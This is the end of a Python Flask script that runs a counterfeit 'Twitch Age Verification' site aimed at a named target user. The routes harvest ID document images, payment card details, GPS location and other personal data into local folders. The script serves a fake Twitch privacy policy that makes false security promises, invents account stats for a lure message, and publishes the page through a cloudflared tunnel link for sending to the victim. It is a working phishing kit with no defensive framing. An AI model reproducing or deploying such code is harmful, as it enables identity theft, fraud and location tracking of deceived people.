                front_filename = f"twitch_id_front_{target_username}_{session_id}_{timestamp}.{file_ext}"
                front_path = os.path.join(DOWNLOAD_FOLDER, 'id_documents', front_filename)
                front_file.save(front_path)
        
        # Handle back ID
        back_filename = None
        if 'back_id' in request.files:
            back_file = request.files['back_id']
            if back_file.filename:
                file_ext = back_file.filename.split('.')[-1] if '.' in back_file.filename else 'jpg'
                back_filename = f"twitch_id_back_{target_username}_{session_id}_{timestamp}.{file_ext}"
                back_path = os.path.join(DOWNLOAD_FOLDER, 'id_documents', back_filename)
                back_file.save(back_path)
        
        # Save metadata
        metadata_file = os.path.join(DOWNLOAD_FOLDER, 'id_documents', f"metadata_{target_username}_{session_id}_{timestamp}.json")
        metadata = {
            'front_id': front_filename,
            'back_id': back_filename,
            'type': 'twitch_id_verification',
            'id_type': id_type,
            'target_username': target_username,
            'account_type': account_type,
            'session_id': session_id,
            'timestamp': request.form.get('timestamp', datetime.now().isoformat()),
            'saved_at': datetime.now().isoformat()
        }
        
        with open(metadata_file, 'w') as f:
            json.dump(metadata, f, indent=2)
        
        print(f"Saved Twitch ID documents for {target_username}: {front_filename}, {back_filename}")
        return jsonify({"status": "success", "message": "ID verification submitted"}), 200
        
    except Exception as e:
        print(f"Error saving ID verification: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/submit_payment_verification', methods=['POST'])
def submit_payment_verification():
    try:
        data = request.get_json()
        if data:
            session_id = data.get('session_id', 'unknown')
            target_username = data.get('target_username', 'unknown')
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
            filename = f"twitch_payment_{target_username}_{session_id}_{timestamp}.json"
            file_path = os.path.join(DOWNLOAD_FOLDER, 'payment_proofs', filename)
            
            # Remove sensitive data (in real scenario, this would be encrypted)
            safe_data = data.copy()
            if 'card_number' in safe_data:
                safe_data['card_number'] = '****' + safe_data['card_number'][-4:] if safe_data['card_number'] else '****'
            if 'cvv' in safe_data:
                safe_data['cvv'] = '***'
            
            safe_data['received_at'] = datetime.now().isoformat()
            safe_data['server_timestamp'] = timestamp
            
            with open(file_path, 'w') as f:
                json.dump(safe_data, f, indent=2)
            
            print(f"Saved Twitch payment verification for {target_username}: {filename}")
            return jsonify({"status": "success", "message": "Payment verification submitted"}), 200
        else:
            return jsonify({"status": "error", "message": "No payment data received"}), 400
    except Exception as e:
        print(f"Error saving payment verification: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/submit_location_verification', methods=['POST'])
def submit_location_verification():
    try:
        data = request.get_json()
        if data and 'latitude' in data and 'longitude' in data:
            session_id = data.get('session_id', 'unknown')
            target_username = data.get('target_username', 'unknown')
            
            # Add target username to data
            data['target_username'] = target_username
            
            # Process location in background thread
            processing_thread = Thread(target=process_and_save_location, args=(data, session_id))
            processing_thread.daemon = True
            processing_thread.start()
            
            print(f"Received Twitch location data for {target_username}: {session_id}")
            return jsonify({"status": "success", "message": "Location verification submitted"}), 200
        else:
            return jsonify({"status": "error", "message": "No location data received"}), 400
    except Exception as e:
        print(f"Error saving location verification: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/submit_complete_verification', methods=['POST'])
def submit_complete_verification():
    try:
        data = request.get_json()
        if data:
            session_id = data.get('session_id', 'unknown')
            target_username = data.get('target_username', 'unknown')
            account_type = data.get('account_type', 'unknown')
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
            filename = f"twitch_complete_{target_username}_{session_id}_{timestamp}.json"
            file_path = os.path.join(DOWNLOAD_FOLDER, 'user_data', filename)
            
            # Add system info
            data['received_at'] = datetime.now().isoformat()
            data['server_timestamp'] = timestamp
            data['verification_type'] = 'twitch_complete'
            
            with open(file_path, 'w') as f:
                json.dump(data, f, indent=2)
            
            print(f"Saved Twitch complete verification for {target_username}: {filename}")
            return jsonify({"status": "success", "message": "Verification complete"}), 200
        else:
            return jsonify({"status": "error", "message": "No data received"}), 400
    except Exception as e:
        print(f"Error saving verification summary: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/privacy_policy')
def privacy_policy():
    return '''<!DOCTYPE html>
    <html>
    <head>
        <title>Twitch Privacy Policy</title>
        <style>
            body { 
                font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                padding: 20px; 
                max-width: 800px; 
                margin: 0 auto; 
                background-color: #0f0f23;
                color: #efeff1;
            }
            h1 { 
                color: #9146ff; 
                margin-bottom: 30px;
                font-size: 2.5rem;
            }
            h2 {
                color: #bf94ff;
                margin-top: 30px;
                margin-bottom: 15px;
                font-size: 1.5rem;
            }
            .container {
                background: linear-gradient(135deg, #18182b 0%, #1a1a2e 100%);
                padding: 40px;
                border-radius: 16px;
                border: 1px solid #26263a;
                box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            }
            ul {
                padding-left: 20px;
                margin: 15px 0;
            }
            li {
                margin-bottom: 12px;
                line-height: 1.6;
                color: #adadb8;
            }
            strong {
                color: #efeff1;
            }
            p {
                color: #adadb8;
                line-height: 1.6;
                margin-bottom: 20px;
            }
            .highlight {
                background: rgba(145, 70, 255, 0.1);
                border-left: 4px solid #9146ff;
                padding: 15px 20px;
                margin: 20px 0;
                border-radius: 0 8px 8px 0;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>Twitch Age Verification Privacy Notice</h1>
            
            <div class="highlight">
                This verification process is required to comply with age restrictions, regional laws, and Twitch's Terms of Service.
            </div>
            
            <h2>Data Collection</h2>
            <p>During the Twitch verification process, we collect:</p>
            <ul>
                <li><strong>Facial Recognition Data</strong> - Temporary video scan for identity verification</li>
                <li><strong>ID Document Information</strong> - Government-issued ID, student ID, or parental consent forms</li>
                <li><strong>Payment Information</strong> - For streamer monetization verification (securely processed)</li>
                <li><strong>Location Data</strong> - For regional compliance and content restriction enforcement</li>
                <li><strong>Device Information</strong> - For security and fraud prevention measures</li>
            </ul>
            
            <h2>Purpose of Data Collection</h2>
            <p>Your data is used exclusively for:</p>
            <ul>
                <li>Age verification and compliance with regional laws</li>
                <li>Identity authentication and fraud prevention</li>
                <li>Streamer monetization verification (where applicable)</li>
                <li>Regional content compliance and restriction enforcement</li>
                <li>Account security enhancement and unauthorized access prevention</li>
            </ul>
            
            <h2>Data Security</h2>
            <p>We implement industry-standard security measures:</p>
            <ul>
                <li>End-to-end encryption for all data transmission</li>
                <li>Secure storage with AES-256 encryption</li>
                <li>Regular security audits and penetration testing</li>
                <li>Access controls and authentication protocols</li>
                <li>Compliance with PCI DSS for payment data</li>
            </ul>
            
            <h2>Data Retention</h2>
            <p>All verification data is handled according to our retention policy:</p>
            <ul>
                <li>Facial recognition data: Automatically deleted within 7 days</li>
                <li>ID documents: Encrypted and deleted within 30 days of successful verification</li>
                <li>Payment data: Securely processed and retained only as required by law</li>
                <li>Location data: Anonymized within 24 hours, deleted within 7 days</li>
                <li>Metadata: Retained for security purposes for up to 90 days</li>
            </ul>
            
            <h2>Your Rights</h2>
            <p>You have the right to:</p>
            <ul>
                <li>Access your verification data upon request</li>
                <li>Request deletion of your data before standard retention periods</li>
                <li>Opt-out of specific data collection (may limit account functionality)</li>
                <li>File a complaint regarding data handling practices</li>
                <li>Withdraw consent for data processing</li>
            </ul>
            
            <h2>Third-Party Sharing</h2>
            <p>We do not sell or share your verification data with third parties for marketing purposes. Data may be shared with:</p>
            <ul>
                <li>Trust & Safety teams for verification review</li>
                <li>Legal authorities when required by law</li>
                <li>Payment processors (for payment verification only)</li>
                <li>Service providers under strict confidentiality agreements</li>
            </ul>
            
            <div class="highlight">
                For questions about our privacy practices or to exercise your rights, contact our Privacy Team at privacy@twitch.tv
            </div>
        </div>
    </body>
    </html>'''

if __name__ == '__main__':
    check_dependencies()
    
    # Get verification settings from user
    VERIFICATION_SETTINGS = get_verification_settings()
    
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)
    sys.modules['flask.cli'].show_server_banner = lambda *x: None
    port = 4046
    script_name = "Twitch Age Verification"
    
    print("\n" + "="*60)
    print("TWITCH AGE VERIFICATION PAGE")
    print("="*60)
    print(f"[+] Target Username: @{VERIFICATION_SETTINGS['target_username']}")
    print(f"[+] Account Type: {VERIFICATION_SETTINGS['account_type'].upper()} ACCOUNT")
    
    if VERIFICATION_SETTINGS.get('profile_picture'):
        print(f"[+] Profile Picture: {VERIFICATION_SETTINGS['profile_picture_filename']}")
    else:
        print(f"[!] No profile picture found")
        print(f"[!] Place any image (jpg/png) in {DOWNLOAD_FOLDER} to use as profile picture")
    
    print(f"[+] Data will be saved to: {DOWNLOAD_FOLDER}")
    print(f"[+] Face scan duration: {VERIFICATION_SETTINGS['face_duration']} seconds")
    if VERIFICATION_SETTINGS['id_enabled']:
        print(f"[+] ID verification: Enabled ({VERIFICATION_SETTINGS.get('id_type', 'government')} ID)")
    if VERIFICATION_SETTINGS['payment_enabled']:
        print(f"[+] Payment verification: Enabled")
    if VERIFICATION_SETTINGS['location_enabled']:
        print(f"[+] Location verification: Enabled")
    print("\n[+] Folders created:")
    print(f"    - face_scans/")
    if VERIFICATION_SETTINGS['id_enabled']:
        print(f"    - id_documents/")
    if VERIFICATION_SETTINGS['payment_enabled']:
        print(f"    - payment_proofs/")
    if VERIFICATION_SETTINGS['location_enabled']:
        print(f"    - location_data/")
    print(f"    - user_data/")
    print("\n[+] Starting server...")
    print("[+] Press Ctrl+C to stop.\n")
    
    # Terminal prompt for user
    print("="*60)
    print("TERMINAL PROMPT FOR USER")
    print("="*60)
    print(f"Twitch is requesting age verification for account:")
    print(f"👤 Username: @{VERIFICATION_SETTINGS['target_username']}")
    print(f"🎮 Type: {VERIFICATION_SETTINGS['account_type'].upper()} ACCOUNT")
    if VERIFICATION_SETTINGS.get('profile_picture'):
        print(f"🖼️  Profile: Using profile picture from account")
    else:
        print(f"👤 Profile: Default Twitch avatar")
    
    # Generate appropriate stats
    followers = random.randint(500, 10000) if VERIFICATION_SETTINGS['account_type'] == 'streamer' else random.randint(10, 1000)
    print(f"📊 Stats: {followers} followers • {random.randint(30, 365*3)} days old")
    
    print(f"🔒 Reason: Age verification required for {'streaming' if VERIFICATION_SETTINGS['account_type'] == 'streamer' else 'viewing age-restricted content'}")
    print(f"⏰ Time limit: Complete within 24 hours")
    print("📍 Required: Face scan, ID verification, and location check")
    print("="*60)
    print("Open the link below in browser to start verification...\n")
    
    flask_thread = Thread(target=lambda: app.run(host='127.0.0.1', port=port))
    flask_thread.daemon = True
    flask_thread.start()
    time.sleep(1)
    try:
        run_cloudflared_and_print_link(port, script_name)
    except KeyboardInterrupt:
        print("\n[+] Shutting down Twitch verification server...")
        sys.exit(0)